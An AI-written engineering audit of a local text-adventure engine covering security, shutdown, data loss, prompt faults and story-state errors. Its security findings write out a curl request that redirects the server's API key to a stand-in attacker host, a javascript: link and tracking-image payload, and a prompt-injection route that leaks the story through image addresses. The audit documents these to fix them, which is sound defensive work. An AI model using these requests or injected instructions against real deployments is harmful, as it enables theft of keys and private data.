# Defects and risks of the running engine

Date: 2026-11-09. Commit: `b0c8fe41`. Auditor: Claude (Fable 5.2). Two passes.

This audit asks one question: does the engine do what it means to do, safely? It covers security, shutdown, data safety, the model boundary, the prompts, the recorded Game state against the story, and the dashboard. It does not ask whether the engine, the content or the way of working are the right ones. `audit-catalogue.md` lists those other audits.

## How to read this report

- Each finding has a status. **Ran it** means that I started a probe server and saw the result. **Read it** means that I read the code and did not run it. **Measured** means that I counted it in stored data. **Inferred** means that I did not confirm it.
- The probe server was the binary `target/debug/chronicler_engine`, built at 20:55 on 2026-11-09. It ran in `/tmp/fable-probe` with a fake model endpoint and fake keys. It did not read `.env` and it did not touch the repository.
- The earlier audit in `.scratch/invariant-audit/` has 53 findings. I do not repeat them. Section 5 says which of them I saw again. It also says, for each finding of this report, what your other records already hold.
- Section 8 holds every question for the owner, each with my recommendation. I did not wait for an answer to any of them.
- Section 9 lists what pass 2 corrected in pass 1.
- I changed no file outside `tmp/fable-audit/`.

## 1. Summary

The core of the engine is in good condition. The gate, the transactions, the HTML escaping, the prompt layout and the failure display are careful work (section 6). The problems are in three other places:

- **The edges of the server:** what it trusts, how it stops, where it keeps its data (findings 1, 2, 5, 8).
- **The state that the engine keeps about the story.** In a long story, the recorded Room and the recorded Characters present are often wrong, and the wrong state then changes the story (findings 9, 11, 12).
- **What the player and the tuner cannot do or see** (findings 3, 4, 7, 10, 13).

| # | Finding | Kind | Status | Cost of the fix |
|---|---|---|---|---|
| 1 | One request from any web page sends the API key to an address that the page chooses | Security | Ran it | Small |
| 2 | Ctrl-C does not stop an Autoplay run. The process stays and continues to call the model | Defect | Ran it | Small |
| 3 | No data file reaches an existing database: not a Character, a Persona, a World, a map or a default prompt preset | Product gap | Read it | Small to medium |
| 4 | A Narration that the model cut at the token limit looks like a complete Narration | Defect | Ran it | Small |
| 5 | The story log renders `javascript:` links and remote pictures from model text | Security | Ran it | Small |
| 6 | The prompt of an event Narration has three faults | Prompt quality | Read it in a stored call | Small |
| 7 | No streaming, one fixed 180-second limit, no second try for the narrator | Product gap | Read it | Large (streaming), small (the rest) |
| 8 | The database is next to the binary. A clean of the target dir deletes the Games, the edited prompt presets and the stored keys | Data safety | Read it | Small |
| 9 | 10 of 16 added Rooms in the stored stories are duplicates. An added Room keeps one fixed description | Game state | Measured | Medium |
| 10 | The LLM message record cannot answer "which call wrote this Swipe?" (a recorded owner decision, so a question) | Tuning | Read it | Medium |
| 11 | In a long story the recorded Room and Characters present are wrong for long parts, and the wrong state moves the story | Game state | Measured in 3 trials | Medium |
| 12 | The analysis after an Impersonate Input changes the state before the narrator has answered | Game state, cost | Measured in 3 trials | Small |
| 13 | After 50 Messages the story log does not scroll to a new Narration | Defect | Ran it | Small |
| 14 | The story leaves the present day in every trial, also after the fix of the World text | Story quality | Measured in 3 trials | Small to try |

If you do only four things: fix finding 1 (with 5), fix finding 2, fix finding 13, and decide finding 12.

## 2. Findings of pass 1

### 1. One request from any web page sends the API key away

**Status: ran it.** This is the most important finding.

What happens:

1. The server listens on all interfaces by default (`src/utils/cli.rs:36`, `default_value = "0.0.0.0"`). Commit `df7d5980` (2026-09-29) chose this default on purpose.
2. No route checks who sent a request. The server does not check the `Origin` header or the `Host` header. It has no login.
3. `POST /connections/test` takes a Connection from form fields and calls it at once (`settings.rs:364`, `test_form_connection_handler`).
4. When the form has no key, the Connection uses the key of the environment (`LlmConnection::resolve_api_key`, `src/domain/model/settings.rs:399`). The form also sets the address of the call (`conn_base_url`).

So a request with `conn_provider=openrouter`, an empty `conn_api_key` and `conn_base_url=https://attacker.example/v1` makes the server send `Authorization: Bearer <OPENROUTER_API_KEY>` to the attacker. A browser sends such a form from any web page without a preflight, because the content type is `application/x-www-form-urlencoded`. The player only has to open a hostile page while the server runs.

The probe:

```
$ curl -X POST http://127.0.0.1:39100/connections/test \
    -H 'Origin: https://evil.example' \
    --data 'conn_name=x&conn_provider=openrouter&conn_model=m&conn_api_key=&conn_base_url=http://127.0.0.1:39111/v1'
<div class="connection-test-result success">OK · OpenRouter m · 67 ms</div>

fake endpoint log:
{"POST": "/v1/chat/completions", "auth": "Bearer sk-FAKE-AUDIT-KEY-0001", ...}
```

Four related faults make it worse:

- **A stored key is in the HTML.** `GET /fragment/connections/:id/edit` answers with `value="<the key>"` (`settings/templates/settings.rs:174`). The probe read `sk-STORED-KEY-0002` back with a foreign `Host` header. A person on the same network can read every stored key, because of point 1.
- **Every other route is open in the same way.** A web page can delete a Game, change a prompt preset or start an Autoplay run of 100 Cycles on your credit.
- **The `Host` header is not checked.** A DNS rebinding attack can then read the answers too, not only send requests. The private-network rules of current browsers reduce this risk. They do not remove it.
- **The server serves the whole `data/` folder.** `GET /data/settings.json` answers `200` (ran it). The route needs only `data/images/`. A key that an author writes into the seed file is then readable on the network.

The owner's records have this as an open question, not as a defect: "Is the lack of authentication and CSRF a stated rule (a local, single-user tool) or the state of the code?" (`.scratch/code-concepts/assets/research-10-synthesis.md`, Q67). `PRODUCT.md` lists "Whether a release needs accounts or stays a local install" as an open decision. The key leak answers the first question for both cases: a local tool also needs the check, because the browser on the same machine is the attacker's way in. `architecture_system.md` says that "TLS termination and reverse proxying are workspace-operator concerns". A proxy does not stop this request either.

**Recommended fix.** These are four small changes. Each one closes a part.

| Change | Closes |
|---|---|
| One route layer next to `refuse_stale_game`: refuse a request whose `Origin` or `Sec-Fetch-Site` shows another site, and a request whose `Host` is not an address that the server was started with | Every cross-site request, and DNS rebinding |
| Use the key of the environment only when the Connection has the default address of its provider | The key leak, also for a request that passes the layer |
| Do not render a stored key. Show an empty field with "a key is stored". An empty field in a save keeps the stored key | The key in the HTML |
| Listen on `127.0.0.1` by default. `build.py run` passes `--host 0.0.0.0` when the container needs it (`build.py:1268` mirrors the default) | The network reader |

### 2. Ctrl-C does not stop an Autoplay run

**Status: ran it.**

A Job and an Autoplay run are `spawn_blocking` tasks (`job.rs:93`, `driver.rs:64`). On Ctrl-C the HTTP server stops (`server.rs:51`). Then `start_server` returns and drops the tokio runtime (`run.rs:132`). The drop of a runtime waits for every blocking task. Nothing tells the run to stop. So the process stays until the run has played its whole Budget, and it calls the model the whole time. The dashboard is gone, so the player cannot press Stop. A second Ctrl-C does nothing. The cause is probably that tokio has replaced the signal handler (**inferred**).

The probe, with a Budget of 30 Cycles and a fake model that answers in 2 seconds:

```
23:23:23  autoplay run started game=1 budget=30
23:23:28  Shutdown signal received, shutting down...        <- Ctrl-C
          port closed, process alive
23:23:31  autoplay cycle ended cycle=1
23:23:40  autoplay cycle ended cycle=2
23:23:56  autoplay cycle ended cycle=4                      <- after a second Ctrl-C
```

The fake endpoint got 15 more calls in the 25 seconds after the first Ctrl-C. `kill -TERM` stopped the process. With a real Connection and a Budget of 100, the run can continue for about 16 minutes and make about 400 calls. Those are the numbers of the stored trial `tmp/ltm09/redmist_julian/trial-1` (968 s, 402 calls).

**Recommended fix.** After the server ends, stop every held Game through the gate (the same path as `GameWriter::stop`), then end the runtime with `shutdown_timeout`. A Job that is in a model call then loses at most that one call. Handle SIGTERM in the same way, because `docker stop` sends SIGTERM.

### 3. No data file reaches an existing database

**Status: read it.** Pass 2 made this finding wider. Pass 1 named only the Character and the Persona.

The boot seeds each kind of record only when its row is missing:

| Kind | Where | What the boot does when the row exists |
|---|---|---|
| World and map | `bootstrap/load.rs`, `process_world_dir` | Keeps the row. It reads only the id |
| Character | `storage/characters.rs:63` | `INSERT OR IGNORE` |
| Persona | `storage/personas.rs:62` | `INSERT OR IGNORE` |
| Default prompt preset | `bootstrap/run.rs`, `process_preset_file` | Keeps the row when it has any text |
| Settings | `storage/settings.rs` | `INSERT OR IGNORE` |

And the dashboard cannot change most of them:

- No route exists for a Character or a Persona (`builders/router.rs`). The storage has no `UPDATE` for them.
- A default prompt preset is read-only in the dashboard ("Cannot edit default presets", `prompt_preset_service.rs`). The author makes a copy and edits the copy.
- A World that the dashboard creates gets no Character. The one exception is a World whose key is also the id of a World folder in `data/worlds/`.

So after the first start, an edit to a Character file, a Persona file, a World file or a shipped prompt preset changes nothing. The only way to load it is to delete the database. That also deletes every Game, every edited prompt preset and every stored key.

Your records hold the fact, but not as a gap: "after the first boot the database wins for every kind, and an edit of a file in `data/` never reaches a stored World, Character or Persona" (`.scratch/state-machines-next/assets/catalogue.md`, E3).

The owner decided on 2026-11-03 that "authors edit the data files, as today" and that a card form in the dashboard is out of scope (`.scratch/long-term-memory-and-state/map.md`, *Out of scope*). That decision needs this path to work, and it does not. `ENVIRONMENT.md` line 95 says that a World edit in `data/` "does not reach a target dir with a gate copy until the next full gate". It does not reach an existing database after the gate either.

The storage already has the correct write for a World: `seed_world` is an upsert that keeps the World id and its Characters (`storage/worlds.rs`, with the test `test_seed_world_keeps_id_and_dependents`). The boot does not call it for an existing World. The closed ticket that made the upsert says so: "bootstrap skips worlds that already exist … so no shipped path re-seeds an existing key".

**Recommended fix.** At boot, write each seeded kind again when its file differs from the row: the World and map through `seed_world`, and a new upsert for the Character, the Persona and the default prompt preset. A World that the dashboard edited needs a rule (section 8, question 1).

Before a Character can change, change one thing in the Swipe state. `SceneState.characters_present` stores whole Character cards (`scene_state.rs:11`), and the narrator prompt reads the cards from the Swipe state, not from the World. Today this only costs space: the cards are 72 % to 93 % of each Swipe state (about 4.5 kB for each Swipe, against 0.8 kB of text, measured in five stored Games). After a Character can change, it becomes a defect: a Retry writes with the old card. Store the ids only.

### 4. A Narration that the model cut looks complete

**Status: ran it.**

`parse_chat_response` accepts every answer that has text (`response.rs:70`). It reads `finish_reason` only when the text is empty (`response.rs:83`). The transport does this on purpose: the test `test_length_finish_reason_with_content_is_an_answer` pins it. The gap is after the transport. Nothing carries the fact to the Job, to the record or to the player.

The probe returned `Carla opened the door and said, "Before you go in, there is one thing you must` with `finish_reason: "length"`. The story log showed the cut text, the status showed **Ready**, and the failure banner was empty.

A reasoning model makes this likely: the reasoning uses the same `max_tokens`. For the Quantifier, a cut answer is cut JSON. The parser then reads Character ids from the raw text, with lower confidence.

**Recommended fix.** Carry `finish_reason` out of the transport in `LlmCallResult`. For a Narration, keep the text and show a notice on the Swipe that the model stopped at the limit. For the Quantifier and the Options Agent, treat it as a failed attempt, so that the second attempt runs.

### 5. The story log renders `javascript:` links and remote pictures

**Status: ran it.**

`markdown_to_html` turns raw HTML into text, and that part is correct (`http/utils/view_models.rs:17`). But it passes links and pictures as they are. The probe made the model answer with markdown, and the story log held:

```html
<a href="javascript:alert(document.domain)">Open the ledger</a>
<img src="http://127.0.0.1:39111/track.png?leak=story" alt="map" />
```

The same renderer shows the opening text of a World. Two attacks follow:

- A picture loads without a click. Text in a World file or a Character card from another person can tell the model to end each Narration with a picture whose address holds a summary of the story. The story then leaves the machine with each render.
- A `javascript:` link runs in the dashboard after one click. Script in the dashboard can read a stored key (finding 1).

**Recommended fix.** In `sanitize_markdown_event`, drop the picture events (or allow only addresses under `/data/`), and keep a link only when its address starts with `http://` or `https://`. A story has little use for either. A `Content-Security-Policy` header with `img-src 'self' data:` is a second barrier for the pictures.

### 6. The prompt of an event Narration has three faults

**Status: read it** in a stored call: call 1450 of the trial `tmp/ltm09/redmist_julian/trial-1` (the one event call of that trial). The code agrees.

1. **The last Narration is in the prompt twice.** It is the `<LastMessage>` history entry, and `continuation_user_message` puts it in again after "Previous narration:" (`narrator.rs:185-195`). The weekly retro of 2026-11-04 found this fault too (R7). Its route was "a new task ticket", and no ticket exists. Faults 2 and 3 are in no record.
2. **The Trigger direction is labelled as the player's Input.** The message goes through `render_user_layer`, which wraps it in `<PlayerInput>` (`assembler.rs:470`). The prompt preset says directly above it: "The player's next action is provided above." So the model is told that the author's direction is something the Persona did.
3. **The Character of the Trigger is not in `<CharactersPresent>`.** The Trigger in the trial is "Gabriella greets the player". The block said "No Characters are present in this Room". The model got only the two-line summary of Gabriella, and not her description or personality.

A smaller point: the call had 0 cached tokens. The Narration calls before and after it had 2,176 to 2,816 cached tokens with the same prompt start. The cause is probably the session key, which holds the Role (`chat_completions.rs`, `session_header_value`). The event call has the Role Trigger. **Inferred.**

The shipped World has one Trigger, so this prompt runs once in each Game. The cost of the fault is small today. It grows with each Trigger that an author adds.

**Recommended fix.** Give the event its own closing layer, for example `<Event>` with the direction and the instruction, in place of the Player Input layer. Remove the "Previous narration" copy. Add the card of the Trigger's Character to the present block for this one call.

### 7. No streaming, one fixed time limit, no second try

**Status: read it.**

- Each call sends `"stream": false` (`request.rs:79`). The player sees nothing until the whole Narration exists. In the three trials, the median narrator call took 3.6 to 4.4 s with a fast model. `PRODUCT.md` says that success means the player stays inside the story. For this kind of product, text that appears while the model writes is the largest single improvement to how it feels.
- One limit of 180 seconds covers the whole call (`client.rs:26`). A slow reasoning model can pass it. The call then fails after the provider has done the work.
- The narrator call has one attempt. The Quantifier and the Options Agent have two. One HTTP 429 or 502 ends a Job, and it ends an Autoplay run. A run of 100 Cycles makes about 400 calls.
- Each call builds a new HTTP client (`client.rs:25`). So each call makes a new TLS connection.
- A Stop does not end the model call. This is the documented design, but with a blocking call it also holds a thread for up to 180 seconds.

**Recommended order.** First the three small changes: one shared client in `ChatCompletionsBackend`, a connect limit and a longer total limit, and one more attempt for the narrator on a network fault, a 429 or a 5xx. Streaming is a larger design task. It changes the provider port, the Job (a text that grows), the change counters and the story log. It should get its own map. The dashboard-design map already has a ticket for the visible part ("Decide how a generation shows on the Game tab", open).

### 8. The database is next to the binary

**Status: read it.** `ENVIRONMENT.md` documents the location. It does not name the losses.

The database path is `<folder of the binary>/chronicler_<port>.db` (`run.rs:46-50`). No flag changes it.

- In development the folder is `<target-dir>/debug/`. `cargo clean` deletes it. The full gate deletes the target dir of an idle linked worktree with `shutil.rmtree` (`scripts/remove_worktrees.py:268`). A dev server that ran there loses its Games, its edited prompt presets and its stored keys.
- An edited prompt preset is only in that database. The seed files in `data/prompt_presets/` do not get the edit, and no export exists. The work of a tuning session can be lost with one clean.
- A different `--port` is a different database. The Games seem to be gone.
- Migrations 28 and 30 delete every Game (`plumbing.rs`). This is your rule today (no backward compatibility). Before a public release, a migration must make a copy of the file first.
- The paths have different anchors. The data and the database are relative to the binary. `assets/`, the pictures under `/data` and `logs/` are relative to the working directory (`router.rs:203-205`). **Ran it:** a server that starts from another directory answers `200` for `/` and `404` for every script, every style sheet and every picture. The page is empty, and no message says why.

**Recommended fix.** One `--data-dir` flag (default: a `chronicler` folder in the user's data directory, or the working directory in development) that anchors the database, the assets and the logs. An "export this prompt preset as a seed file" action closes the tuning loss.

### 9. Added Rooms: duplicates and one fixed description

**Status: measured.** This adds data to finding llm-02 of the earlier audit. The state-machines map has the code path too (B9), with the note "that a model call answers with that name is inferred" and the disposition "Leave it". Its question to the owner is still open: "Must the Persona be able to walk back into an added Room?" The counts below show that the model does answer with that name, in most stories that leave the map.

`walk` resolves a destination by Room id only (`game_rules.rs:136`). Each miss makes a new Room (`game_rules.rs:124-131`). The Quantifier prompt lists only the Rooms of the map, so the model cannot name an added Room by its id. I counted the added Rooms in the stored stories:

| Story | Added Rooms in the last Swipe state |
|---|---|
| Dev database, Game 4 | `mansion_kitchen` (the map has `kitchen`, named "Mansion Kitchen") |
| Dev database, Game 8 | `sable_street`, `west_wing_attic`, `west_wing_attic` |
| Dev database, Game 10 (the trial `ltm09`) | `music_room` × 3, `chandlery` × 2 |
| Trial `lt15/reference` | `harbour_road` × 7 |
| Dev database, Game 3 and Game 9 (the trial `lt15/new`) | none |

16 added Rooms, 6 different places. 10 of 16 are duplicates, and one more is a Room of the map under another name. In the two trials where I traced each one, an Impersonate Input made 5 of the 9 duplicates (finding 12) and a Narration made 4.

A second fault: every added Room has the description "A place you have never seen before." (`game_rules.rs:127`). The narrator prompt shows that sentence in `<GameState>` on every later call in that Room, also after 50 Messages there.

**Recommended fix.** The earlier audit names it: one resolve function for the Quantifier output (id, then name, over the Rooms of the map and the added Rooms). Add the added Rooms to the Quantifier list. Leave the description of an added Room empty, and render no description line for it.

### 10. The LLM message record cannot answer the tuner's first question

**Status: read it.**

- The table keeps the newest 50 rows (`llm_messages.rs:11`). A Cycle makes 4 calls, so the record covers about 12 Cycles. In an Autoplay run, the calls of the start are gone before the run ends.
- A row has no Game and no Swipe. The tuner cannot open "the call that wrote this Narration". `scripts/trial.py` says the same about its token count: it "covers every model call … because `llm_messages` has no Game column". The dashboard-design map has an open ticket for the link in the page ("Decide the link from a story entry to its LLM message"). The link needs these columns first.
- The engine does not store the `usage` of an answer (prompt, completion and cached tokens). The trial script reads it from the raw JSON. With the numbers stored, the dashboard can show cost. The engine can also see when a local model cut the prompt without an error. **Inferred**, not tested here: Ollama does that when the prompt is longer than its context setting.

**This reopens a decision.** The owner decided on 2026-10-31 that `llm_messages` "is a debug record … it keeps only the newest 50 rows and has no `game_id`" (`.scratch/prompt-flexibility/assets/trial-prototype.md`). The trial script copies each row for that reason. So this finding is a question, not a defect (section 8, question 9).

**Recommended, if the decision changes.** Add `game_id`, `message_id`, `swipe_index` and the three token counts to the row. Keep the rows of the active Game longer, or keep the header of a row longer than its body.

## 3. Findings of pass 2

Pass 2 read three stored trials of 100 Cycles each. All three use the World `redmist_estate`, the Persona `julian` and the model `deepseek-v4.1-flash`, in Autoplay. So the numbers describe a story where the model also plays the Persona. I did not measure a story with typed Inputs. The script is `local-only/evidence/trial_story_stats.py`, and its output for each trial is in `local-only/evidence/`.

### 11. The recorded state leaves the story, and then moves it

**Status: measured in 3 trials.** The owner's records know the symptom: "The wrong Room or the wrong Characters present in a State line. Known size: 14 to 20 runs in one story. It is a fault of the Quantifier, not of memory" (`.scratch/long-term-memory-and-state/map.md`). The layout-trials map asks two questions about it that are still open: is the cause the data, the Quantifier prompt, or the model? And did a wrong value cause a fault in the story? This finding answers both.

**The size.**

- In each trial, 41 to 44 of about 101 Narrations name no Character of the World. The story is then about people that the model made: a bookkeeper, a shopkeeper, a clerk, a lawyer.
- In the trial `ltm09`, entries 78 to 119 and 157 to 183 play in the town: a house, a shop, a bank. The recorded Rooms for them are `front_gates`, `dining_room` and `entrance_hall`. That is about 70 of 202 entries. I read 25 of them, not all.
- The dashboard shows the picture and the name of the recorded Room during those parts. The narrator prompt gets the description of the recorded Room in `<GameState>`.

**The cause is the design, not the model.** The map has 11 Rooms, and all of them are on the estate. The Quantifier prompt lists those Rooms and says "set destination to the new room". It has no answer for "a place that is not in the list". The model then does one of two things:

| What the model answers | Example | Result |
|---|---|---|
| A new name | `chandlery`, `harbour_road` | An added Room. Correct, but each later visit adds a duplicate (finding 9) |
| The nearest Room of the map | Call 1591: a house in the town comes into view behind a low wall. Answer: `front_gates` | The picture and the description of the estate gates |
| The nearest Room of the map | Call 1595: a butler leads Julian into "the morning room" of that house. Answer: `dining_room` | The Room stays `dining_room` for 56 entries. The story is in the town for the first 39 of them |

The Characters present have the same fault. In call 1667 the scene is a shop in the town with two women that the model made. The recorded Room is the Dining Room. The Quantifier is asked "Which Characters are present in the current room", and it answers with all five Characters of the World.

**A wrong state moves the story.** Entries 118 to 120 of `ltm09`:

1. Entry 118: Julian stands on the step of the shop in the town.
2. Entry 119: the shopkeeper opens the door for him. The Quantifier records the Room `dining_room` and Lisette as present. Lisette is not in the scene.
3. Entry 120: the Impersonate call gets "Dining Room" and Lisette in its prompt. It writes: "Julian came in from the corridor … and stopped at the head of the table. 'Lisette. …'"

The story jumped from the shop to the estate in one entry, with no way home, because the state said so.

**Recommended fix.** Three parts, in this order.

1. Give the Quantifier a rule and an answer for a place off the map: a short name, as it already does in the good cases. With the resolve function of finding 9, a second visit finds the first Room.
2. Ask the Quantifier for the Characters "in the scene of `<LatestMessage>`", not "in the current room". The Room that the prompt shows can be wrong, and the question then has no good answer.
3. Add the counts of this finding to the trial pack, so that a prompt change shows its effect: the Narrations with no roster Character, the added Rooms and their duplicates, and the Room changes for each kind of entry.

Section 8, question 5, asks what a place off the map is in the product.

### 12. The analysis after an Impersonate Input changes the state too early

**Status: measured in 3 trials. The behaviour is in the spec** (`docs/specs/dashboard.md`: an Impersonate Job has "the analysis call"). I did not find the reason in the specs.

An Impersonate Input is what the Persona tries. The Narration after it says what happens. The Quantifier preset says the same: "Base your decision ONLY on what happens in `<LatestMessage>`, not on what the player attempted". But after an Impersonate Input, `<LatestMessage>` is the attempt. A typed Input gets no analysis at all (`generation.rs:86`, and a typed Input has no generation). So the same Input changes the state when the model wrote it, and does not when the player typed it.

What the analysis after an Impersonate Input did, in 100 Cycles:

| Trial | Changed the Room | Changed the Characters present | Calls | Time |
|---|---|---|---|---|
| `ltm09` | 7 times | 11 times | 100 | about 107 s of 968 s |
| `lt15/new` | 9 times | 13 times | 100 | about 146 s of 1,054 s |
| `lt15/reference` | 6 times | 11 times | 100 | about 148 s of 1,209 s |

The time is 100 times the median time of a Quantifier call in that trial.

- It made 5 of the 9 duplicate Rooms that I traced, and the first `harbour_road`.
- Call 1589 of `ltm09` is an example. The Persona says that he will walk up the hill to a house in the town. The analysis records the Room `front_gates`, before any Narration.
- The narrator then writes with a state that already holds the result of the attempt. A Narration that refuses the attempt ("the guard blocks the door") meets a `<GameState>` that says the Persona is through the door.
- It costs about 190,000 input tokens for each 100 Cycles (6 % of the run) and 11 % to 14 % of the run time.

**Recommended fix.** Do not analyse an Impersonate Input. The analysis after the Narration reads the Input and the Narration together, as it does for a typed Input. This removes one call from each Cycle of an Autoplay run. Section 8, question 4.

### 13. After 50 Messages the story log does not scroll to a new Narration

**Status: ran it.**

The story log shows the newest 50 entries (`STORY_WINDOW_SIZE`, `view_query.rs:22`). The scroll to a new entry runs only when the number of entries grew (`assets/dashboard-story-log.js:239`, `storyLogEntryCount(log) <= start.entries`). After 50 Messages, each new entry removes the oldest one. The number stays at 50, and the scroll never runs.

The probe, in Chrome, with a Game of 2,001 Messages and the log at its bottom:

| Step | Entries | Distance from the bottom |
|---|---|---|
| Before the Action | 50 | 0 px |
| The Input shows | 50 | 81 px |
| The Narration shows, status **Ready** | 50 | 267 px |

The player sees their own Input at the lower edge and no Narration (`local-only/evidence/shot-03-no-follow-after-50.png`). In a new Game with 1 to 9 entries the distance stayed 0 px after each Action. During an Autoplay run on the long Game, the log was 6,063 px behind when I looked and 9,481 px behind five seconds later.

So from the 26th Cycle of every Game, the player must scroll by hand after each Action. The spec scenario 30.20 ("A load that appends an entry follows the log's bottom") describes the wanted behaviour. Its test runs with fewer than 50 entries.

The same rule has a second known hole. A Retry writes a new Swipe into the last entry, so the count does not grow, and the new text ends below the fold. The closed ticket that made the scroll records this as a follow-up and names the wider rule: "the log grew while at the bottom".

**Recommended fix.** Use that wider rule: follow when the log was at its bottom and the last entry changed (its id or its Swipe) or the content became taller. It covers the full window and the Retry. Add one browser test with a full window.

### 14. The story leaves the present day in every trial

**Status: measured in 3 trials.** The owner fixed this once: ticket 12 of the layout-trials map added "The story takes place in the present day" to the World description on 2026-11-02. All three trials ran after that fix, and the sentence is in their narrator prompts.

| Trial | Modern words | Period words |
|---|---|---|
| `ltm09` | "phone" 10 times, last in entry 61 | "carriage" from entry 29, a farrier and a bridle in entries 73 to 78, "pounds", "gasworks", "Michaelmas" near the end |
| `lt15/new` | "phone" 9 times, last in entry 7 | "carriage" 28 times, entries 36 to 113 |
| `lt15/reference` | "phone" 9 times, last in entry 27 | "carriage" 17 times, "shilling" 5 times |

The cause is **inferred**, not tested:

- The World text pulls the other way. It says "Built in the colonial era" and "colonial architecture", and the staff are a maid, a chef and a bodyguard.
- The one sentence is in `<WorldLore>`, near the start of the prompt. The history comes after it. After the first carriage, each call reads the period words of the history again, and reads "present day" once.
- The model writes both sides in Autoplay, so nothing pulls it back.

**Recommended to try.** Put the era into the block after the history (`<GameState>` or the writing style), as one line. Count the period words in the trial pack, as in the table above, so that one trial shows whether it worked. This is a cheap trial, not a sure fix.

## 4. Smaller items

Each of these is real, and each is cheap. None of them is urgent.

- **Two dependency advisories apply, and neither is exploitable here.** I checked the RustSec pages on 2026-11-09. The gate has no `cargo audit` or `cargo deny` step.
  - `dotenv` 0.15.0: unmaintained (RUSTSEC-2021-0141). The named replacement is `dotenvy`.
  - `libsqlite3-sys` 0.32.0, through `rusqlite` 0.34: RUSTSEC-2026-0459, dated 2026-11-09. The bundled SQLite can return stale memory when it opens a hostile database file with its `-wal` file. The engine opens only its own database, so the risk is low. The fix is `rusqlite` 0.41, which needs Rust 1.89. `rust-toolchain.toml` pins 1.88.0.
  - `pulldown-cmark` 0.13.3 has two advisories for `ENABLE_WIKILINKS` (RUSTSEC-2026-0414 and 0433). The engine does not set that option, so it is not affected. The fixed version is 0.13.6.
- **The form accepts the provider `mock`.** `ConnectionForm::resolved_provider` parses with `LlmBackendType::ALL`. The form offers only `SELECTABLE`. **Ran it:** a post with `conn_provider=mock` answered "OK · Mock m", and the add answered `200`.
- **One failure sentence covers four different causes.** An HTTP 401 (a wrong key), 402 (no credit), 429 (too many requests) and 500 all show "The language model could not be reached.", because every HTTP status maps to one failure kind (`generation_status.rs:207`). **Ran it** for 500. The Details show the truth, but the remedy differs for each cause, and the sentence sends the player to their network.
- **The Action input is one line** (`assets/index.html:130`, `type="text"`). The Persona's Inputs in the trials have 126 to 144 words on average, in two or three paragraphs. A player cannot type an Input of that shape. The dashboard-design map has an open ticket for the action area.
- **The log has no size limit.** `logging.rs` rotates daily and never deletes (`logs/` holds 104 files, 26 MB). At level `info` the Quantifier writes the full text of each Narration to the log.
- **The gate time in `AGENTS.md` is old.** It says about 145 s. The median of the 20 good full gates since 2026-11-01 is 319 s (`logs/build_history.txt`).
- **`sanitize_for_prompt` has no purpose now.** It replaces `{{…}}` in the Player Input layer with `[FILTERED]`, but no template render runs on that text, and the history entries do not go through it. The weekly retro has this (R16) with the proposal to delete it. The proposal waits for a confirm.
- **`sanitize_llm_output` trims the start of every line.** This removes the indentation of a nested list or a code block in a Narration.
- **The Quantifier call has no JSON mode.** The request has no `response_format`. All 602 Quantifier answers in the three trials were valid JSON, so this matters only for a weaker model.
- **The shipped World uses little of the engine.** It has one Trigger, no Character in any Room of the map, and empty inventories. The trials can therefore say little about Triggers.

## 5. The earlier audit, and what your other records already hold

### The earlier audit is still open

`.scratch/invariant-audit/` has 53 findings and 16 tickets. All 16 tickets have `Status: open`. I saw these findings again at this commit while I read the code:

| Finding | Where | Size of the fix |
|---|---|---|
| world-04, the Trigger order follows a `HashMap` | `game_rules.rs:173` | One line (`CharacterCard::in_id_order`) |
| llm-07, a byte slice of provider text can panic | `response.rs:140`, `quantifier/utils/orchestration.rs:110` | One helper |
| llm-08, a config fault removes both Agents without a message | `wiring.rs:152` | One line |
| llm-04, an edit can save an empty Message | `gate.rs:533` | One check |
| gate-06, a config change during a plain Job is accepted | `gate.rs:477` | Small |
| storage-04, `update_world` has no transaction | `storage/worlds.rs:297` | Small |

My recommendation: the first four are local and need no owner decision. Do them outside the ticket order. In the last 60 days, about 205 of 379 commits touched no file under `src/`, `assets/`, `data/` or `tests/`, and 147 touched the product. The audit found defects that one line fixes, and those fixes wait in the same queue as the grilling tickets.

### What your other records already hold

A scout searched `.scratch/` (without the invariant audit), `docs/`, `PRODUCT.md`, `README.md` and `ENVIRONMENT.md` for each finding. I checked its quotes for the rows marked "decided" and "known".

| Finding | In your records | Where |
|---|---|---|
| 1, key leak and no `Origin` check | Partly. The missing check is an open question. The key leak, the `Host` header and the default host are not recorded | `code-concepts/assets/research-10-synthesis.md` (X18, Q67) |
| 2, Ctrl-C | No | |
| 3, no data file reaches the database | The fact, yes. Not as a gap | `state-machines-next/assets/catalogue.md` (E3), `prompt-flexibility/assets/what-reaches-the-model.md` |
| 4, cut Narration | No. Only the trial script marks a cut Cycle | |
| 5, links and pictures | No. Only the raw HTML rule is recorded | `docs/plans/narration-line-break-tags.md` |
| 6, event Narration prompt | Fault 1 only | `weekly-retro-2026-11-04/assets/README.md` (R7) |
| 7, streaming, limit, retry | As neutral facts. No record calls them a gap, and none puts streaming out of scope | `state-machines-next/assets/scan2-driven.md` |
| 8, database location | The location, yes. Not the losses | `ENVIRONMENT.md` |
| 9, duplicate added Rooms | The code path, yes, with "Leave it". The size was unknown | `state-machines-next/assets/03-dispositions.md` (B9) |
| 10, LLM message record | **Decided** on 2026-10-31: a debug record | `prompt-flexibility/assets/trial-prototype.md` |
| 11, wrong Room and Characters present | The symptom and its size, yes. The cause and the effect on the story were open questions | `long-term-memory-and-state/map.md`, `layout-trials/issues/13-sort-inconsistencies-by-cause.md` |
| 12, analysis after an Impersonate Input | In the spec as behaviour. Not as a question | `docs/specs/dashboard.md` |
| 13, no scroll after 50 Messages | No. The Retry case of the same rule is a recorded follow-up | `_closed/dashboard-ui-review-phase2/issues/03-story-log-follows-new-entries.md` |
| 14, the era | **Known**, and fixed once in the World text. That the fix did not hold is new | `layout-trials/assets/story-inconsistencies.md`, `layout-trials/issues/12-remove-data-conflicts.md` |
| The story log shows only 50 entries | **Decided** on 2026-10-20, with a seed for the scroll-back | `story-scroll-back/idea.md` |
| Smaller items | `sanitize_for_prompt` is known (R16). The `mock` provider is known as a concept. The others are in no record | |

Two recommendations of this report go against a recorded decision or rule:

- **Finding 10** against the decision that `llm_messages` is a debug record.
- **Finding 8**, "copy the file before a migration", against the rule "Do not preserve backward compatibility unless the user asks for it" (`CODING_STANDARDS.md`). The report recommends it only for a public release.

## 6. What I checked and found sound

This part matters as much as the findings. I looked for faults here and did not find them.

- **HTML escaping.** Askama escapes by default. Every hand-built fragment that I read (`error.rs`, `headers.rs`, `forms.rs`, `endpoints.rs`) calls `html_escape`. The JavaScript error surfaces escape too. The probe confirmed that raw HTML from the model shows as text. The links and pictures of finding 5 are the only hole. A path with `..` under `/data` or `/assets` answers `404`.
